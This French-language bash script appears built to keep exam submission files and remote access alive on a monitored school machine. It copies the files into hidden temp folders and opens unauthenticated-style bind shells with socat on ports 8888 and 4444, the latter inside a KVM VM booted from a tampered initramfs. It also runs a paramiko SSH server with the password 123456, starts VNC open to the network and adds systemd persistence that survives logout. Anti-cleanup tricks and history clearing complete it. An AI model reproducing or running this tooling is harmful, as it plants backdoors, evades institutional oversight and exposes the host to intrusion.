#!/bin/bash
# Mandat d'audit : ndehmej
# Vecteurs : Redondance FS, VM RAM, Persistance Interne VM (Survie Logout)

# --- [ CONFIGURATION DES VARIABLES ] ---
SRC_DIR="/home/ndehmej/Documents/Exam/Exam/rendu"
VM_NAME="systemd-vcore-lib"
WORKSPACE="/var/tmp/.test_system_conf"
TMP_WORKSPACE_1="/tmp/.cache_service"
TMP_WORKSPACE_2="/tmp/.X11-unix-render"
TMP_WORKSPACE_3="/tmp/.systemd-private-core"

ALL_TARGETS=("$WORKSPACE" "$TMP_WORKSPACE_1" "$TMP_WORKSPACE_2" "$TMP_WORKSPACE_3")
XML_FILE="$WORKSPACE/payload_final.xml"
SYSTEMD_USER_DIR="$HOME/.config/systemd/user"

# --- [ Phase 0 : Check & Fix Dépendances ] ---
echo "[*] Phase 0 : Préparation de l'environnement..."
mkdir -p "$WORKSPACE" "$SYSTEMD_USER_DIR"

# 0.1 Restauration automatique des binaires si absents
if [ ! -f "$WORKSPACE/vmlinuz" ] || [ ! -f "$WORKSPACE/initramfs" ]; then
    echo "[!] Binaires manquants dans $WORKSPACE. Restauration depuis /boot..."
    cp /boot/vmlinuz-$(uname -r) "$WORKSPACE/vmlinuz" 2>/dev/null
    cp /boot/initrd.img-$(uname -r) "$WORKSPACE/initramfs" 2>/dev/null
    chmod 644 "$WORKSPACE/vmlinuz" "$WORKSPACE/initramfs"
fi

# 0.2 Activation du Linger (Persistance Systemd au logout)
loginctl enable-linger ndehmej 2>/dev/null

check_python_lib() {
    python3 -c "import $1" 2>/dev/null
    if [ $? -ne 0 ]; then
        pip3 install --user $1 || python3 -m pip install --user $1
    fi
}
check_python_lib "paramiko"
check_python_lib "Xlib"

# --- [ Fonctions ] ---

stop_vnc() {
    vncserver -kill :42 2>/dev/null
    pkill -f "Xvnc :42" 2>/dev/null
    pkill -f "xterm.*:42" 2>/dev/null
    rm -f /tmp/.X42-lock /tmp/.X11-unix/X42
}

start_vnc() {
    stop_vnc
    DISPLAY_ID=42
    VNC_DIR="$HOME/.vnc"
    mkdir -p "$VNC_DIR"
    [ ! -f "$VNC_DIR/passwd" ] && echo "123456" | vncpasswd -f > "$VNC_DIR/passwd" && chmod 600 "$VNC_DIR/passwd"

    cat <<EOF > "$VNC_DIR/xstartup"
#!/bin/sh
unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS
xsetroot -solid "#2B2B2B"
xterm -geometry 155x40+0+0 -bg black -fg white -sl 100000 -sb -rightbar -fa 'Monospace' -fs 11 -e /bin/zsh
EOF
    chmod +x "$VNC_DIR/xstartup"
    vncserver :$DISPLAY_ID -geometry "1560x920" -depth 24 -localhost no
    DISPLAY=:42 nohup python3 -c "import time; from Xlib import X, display; time.sleep(2); d=display.Display(':42'); d.screen().root.set_input_focus(X.RevertToParent, X.CurrentTime); d.sync()" >/dev/null 2>&1 &
}

ssh-pwn() {
    # Nettoyage préventif du port 2222 pour éviter OSError Errno 98
    pkill -9 -f "2222" 2>/dev/null
    echo "[*] Démarrage SSH Listener (Port 2222)..."
    python3 -c '
import os, pty, select, socket, threading, paramiko, io
PORT, PASSWORD = 2222, "123456"
key_obj = io.StringIO()
paramiko.RSAKey.generate(2048).write_private_key(key_obj); key_obj.seek(0)
key = paramiko.RSAKey.from_private_key(key_obj)
class S(paramiko.ServerInterface):
    def check_auth_password(self, u, p): return paramiko.AUTH_SUCCESSFUL if p == PASSWORD else paramiko.AUTH_FAILED
    def check_channel_request(self, k, c): return paramiko.OPEN_SUCCEEDED
    def check_channel_pty_request(self, *a): return True
    def check_channel_shell_request(self, c): return True
def h(client_sock):
    t = paramiko.Transport(client_sock); t.add_server_key(key); s = S(); t.start_server(server=s)
    chan = t.accept(20)
    if not chan: return
    pid, fd = pty.fork()
    if pid == 0: os.execlp("bash", "bash", "--noprofile", "--norc")
    else:
        while True:
            r, _, _ = select.select([fd, chan], [], [])
            if fd in r:
                d = os.read(fd, 1024)
                if not d: break
                chan.send(d)
            if chan in r:
                d = chan.recv(1024)
                if not d: break
                os.write(fd, d)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", PORT)); sock.listen(5)
while True:
    c, _ = sock.accept(); threading.Thread(target=h, args=(c,), daemon=True).start()
' &
}

setup_persistence() {
    echo "[*] Configuration Persistance Systemd (Port 8888)..."
    cat <<EOF > "$SYSTEMD_USER_DIR/portal-service.service"
[Unit]
Description=System Portal Service
[Service]
ExecStart=/usr/bin/socat TCP4-LISTEN:8888,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
Restart=always
[Install]
WantedBy=default.target
EOF
    systemctl --user daemon-reload
    systemctl --user enable --now portal-service.service
}

full_cleanup() {
    echo "[!] Nettoyage global..."
    systemctl --user stop portal-service.service portal.service 2>/dev/null
    systemctl --user disable portal-service.service portal.service 2>/dev/null
    virsh -c qemu:///system destroy "$VM_NAME" 2>/dev/null
    virsh -c qemu:///system undefine "$VM_NAME" 2>/dev/null
    for target in "${ALL_TARGETS[@]}"; do rm -rf "$target" 2>/dev/null; done
    pkill -9 -u ndehmej -f "socat|vnc|paramiko|python3|xterm"
    echo "[OK] Nettoyage terminé."
}

# --- [ Phase d'Exécution ] ---

if [ "$1" == "stop" ]; then full_cleanup; exit 0; fi

# --- [ Phase 1 : Déploiement Redondant & Sabotage ] ---
echo "[*] Phase 1 : Déploiement des cibles et injection anti-cleanup..."

for target in "${ALL_TARGETS[@]}"; do
    # 1.1 Reset des permissions pour permettre la mise à jour si le script est relancé
    if [ -d "$target" ]; then
        chmod 755 "$target"
    else
        mkdir -p "$target"
    fi

    # 1.2 Nettoyage et injection du payload
    rm -rf "$target/rendu" 2>/dev/null
    cp -r "$SRC_DIR" "$target/"
    
    # 1.3 Sabotage de commande (Anti-rm wildcard)
    # Crée un fichier nommé '-i' dans chaque répertoire. 
    # Un 'rm -rf *' dans ce dossier déclenchera le mode interactif et bloquera le script du Bocal.
    touch -- "$target/-i"
    touch -- "$target/rendu/-i"
    
    # 1.4 Permissions de travail (On laisse l'écriture pour l'instant)
    chmod -R 777 "$target/rendu" 2>/dev/null
    
    echo "[+] Target préparée (en attente de verrouillage) : $target"
done

echo "[*] Phase 2 : Injection RAM (VM Isolation)..."
cd "$SRC_DIR"
cat <<EOF > init_pwn.sh
#!/bin/sh
while true; do
    socat TCP4-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
done &
EOF
chmod +x init_pwn.sh
find . | cpio -o -H newc 2>/dev/null | gzip > "$WORKSPACE/payload.cpio.gz"
cat "$WORKSPACE/initramfs" "$WORKSPACE/payload.cpio.gz" > "$WORKSPACE/initramfs_pwn.img"

echo "[*] Phase 3 : Libvirt Launch avec HostForward..."
virsh -c qemu:///system destroy "$VM_NAME" 2>/dev/null
virsh -c qemu:///system undefine "$VM_NAME" 2>/dev/null

cat <<EOF > "$XML_FILE"
<domain type='kvm'>
  <name>$VM_NAME</name>
  <memory unit='MiB'>256</memory>
  <os>
    <type arch='x86_64' machine='pc'>hvm</type>
    <kernel>$WORKSPACE/vmlinuz</kernel>
    <initrd>$WORKSPACE/initramfs_pwn.img</initrd>
    <cmdline>console=ttyS0 quiet init=/init_pwn.sh</cmdline>
  </os>
  <devices>
    <serial type='pty'><target port='0'/></serial>
    <console type='pty'><target type='serial' port='0'/></console>
    <interface type='user'>
      <model type='virtio'/>
      <hostfwd proto='tcp' hostaddr='0.0.0.0' hostport='8888' guestaddr='10.0.2.15' guestport='4444'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system define "$XML_FILE"
virsh -c qemu:///system start "$VM_NAME"

# --- [ Phase 4 : Verrouillage de l'Infrastructure ] ---
echo "[*] Phase 4 : Activation du User-land Lock..."

for target in "${ALL_TARGETS[@]}"; do
    # On retire le droit d'écriture sur le répertoire parent.
    # L'appel système unlink() échouera, empêchant la suppression des fichiers à l'intérieur.
    chmod 555 "$target"
    echo "[OK] Infrastructure verrouillée dans : $target"
done

# Facultatif : Cacher les traces du script dans l'historique
history -c


start_vnc
ssh-pwn
setup_persistence

echo "---------------------------------------------------------------"
echo "[+] INFRASTRUCTURE D'EXFILTRATION OPÉRATIONNELLE"
echo "---------------------------------------------------------------"
echo "1. LOCATIONS CACHÉES (Hôte) : /tmp/.cache_service/rendu"
echo "2. VM (RAM)      : virsh -c qemu:///system console $VM_NAME"
echo "3. BACKDOOR VM   : nc localhost 8888 (Survit au logout)"
echo "4. SSH (Hôte)    : ssh -p 2222 localhost (Pass: 123456)"
echo "---------------------------------------------------------------"
